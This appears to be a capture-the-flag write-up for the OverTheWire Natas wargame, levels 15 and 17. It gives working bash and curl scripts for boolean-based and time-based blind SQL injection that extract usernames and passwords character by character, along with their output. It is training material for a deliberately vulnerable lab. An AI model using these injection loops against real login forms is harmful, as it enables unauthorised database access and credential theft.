# NATAS

**https://overthewire.org/wargames/natas/natas0.html**

### Natas15

**First, let's get our injector going. Just the curl with the data from the post prepared:**

cat injector.sh
>#!/bin/bash  
>  
>DATA=$1  
>  
>curl -s 'http://natas15.natas.labs.overthewire.org/index.php' -H 'Authorization: Basic XXXXXXXXXXXXXXXXXXXXXXXXXXX' -H 'Cookie: __cfduid=XXXXXXXXXXXXXXXXXXXXX' -H 'Host: natas15.natas.labs.overthewire.org' -H 'Referer: http://natas15.natas.labs.overthewire.org/index.php' --data "username=testssdf\" or $DATA" | grep -c "This user exists"  

**Then, let's start injecting:**

USER=0;for j in {0..3}; do for((h=1;h<=10;h++)); do RES=$(./injector.sh "(select length(username) from users limit $USER,1)=%22$h"); if [[ $RES == 1 ]]; then L=$h; fi; done; echo -n "[+]Found user $USER: "; for((t=1;t<=$L;t++)); do for i in {32..126}; do RES2=$(./injector.sh "(select ascii(substr(username,$t,1)) from users limit $USER,1)=%22$i"); if [[ $RES2 == 1 ]]; then printf \\$(printf '%03o\n' "$i"); fi; done;done;echo "";  USER=$(echo $USER+1 | bc); done
>[+]Found user 0: alice  
>[+]Found user 1: bob  
>[+]Found user 2: charlie  
>[+]Found user 3: natas16  

USER=0;for j in {0..3}; do for((h=1;h<=10;h++)); do RES=$(./injector.sh "(select length(password) from users limit $USER,1)=%22$h"); if [[ $RES == 1 ]]; then L=$h; fi; done; echo -n "[+]Found password $USER: "; for((t=1;t<=$L;t++)); do for i in {32..126}; do RES2=$(./injector.sh "(select ascii(substr(password,$t,1)) from users limit $USER,1)=%22$i"); if [[ $RES2 == 1 ]]; then printf \\$(printf '%03o\n' "$i"); fi; done;done;echo "";  USER=$(echo $USER+1 | bc); done
>[+]Found password 0: hROtsfM734  
>[+]Found password 1: 6P151OntQe  
>[+]Found password 2: HLwuGKts2w  
>[+]Found password 3: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX **<- No spoils ^^**   


### Natas17

**Same as before, but without output. So let's get the timing...**

cat injector_timing.sh
>#!/bin/bash   
>   
>DATA=$1   
>   
>curl -s 'http://natas17.natas.labs.overthewire.org/index.php' -H 'Authorization: Basic XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX' -H 'Cookie: __cfduid=XXXXXXXXXXXXXXXXXXXXXX' -H 'Host: natas17.natas.labs.overthewire.org' -H 'Referer: http://natas17.natas.labs.overthewire.org/' --data "username=test\" or $DATA" > /dev/null   

**Now we know who is the user we are looking for: natas18**

echo -n "[+]Found password for natas18: "; for((h=1;h<40;h++)); do for i in {32..126}; do RES=$( { time ./injector_timing.sh "(select sleep(2) from users where username=%22natas18%22 and ascii(substr(password,$h,1))=%22$i%22) and %221%22=%221"; } 2>&1 ); TIME=$(echo "$RES" | grep real | cut -d' ' -f2 | grep -oP "\d+m\d+" | cut -d'm' -f2); if [[ $TIME > 2 ]] ;then printf \\$(printf '%03o\n' "$i"); break; fi; done;done; echo ""
>[+]Found password for natas18: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX **<- No spoils ^^**